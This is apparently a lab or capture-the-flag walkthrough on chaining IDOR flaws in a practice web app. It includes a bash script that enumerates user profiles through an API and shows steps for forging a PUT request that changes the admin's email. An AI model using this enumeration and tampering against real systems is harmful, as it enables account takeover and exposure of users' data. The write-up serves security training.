# Chaining IDOR Vulnerabilities

Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

**Step 1** - Update Profile

* Fill the forms and click on Update Profile

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

* Send the PUT Request to the Repeater

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Enumerate other profiles

* Change the profile ID - Notice on the Response that the information belongs to the other user

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

* Create a script to easily enumerate all the users

```bash
#!/bin/bash

url='http://SERVER_IP:SERVER_PORT/profile/api.php/profile'

for i in {1..10}; do
    response=$(curl -s "$url/$i")  # Get the response from the API

    # Extract the uid, role, and uuid
    uid=$(echo "$response" | grep -oP '"uid":"\K[^"]+')
    role=$(echo "$response" | grep -oP '"role":"\K[^"]+')
    uuid=$(echo "$response" | grep -oP '"uuid":"\K[^"]+')

    # Print the extracted information
    echo "ID: $i, UID: $uid, Role: $role, UUID: $uuid"
done

```

* The admin's ID is 10

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Change the admin email

* Use the previous request to retreive the admins data
* Change it to a PUT Request and make sure the email is changed to 'flag@idor.htb'

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Get the flag

* Access to the 'Edit Profile' page

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

* And we got the flag!
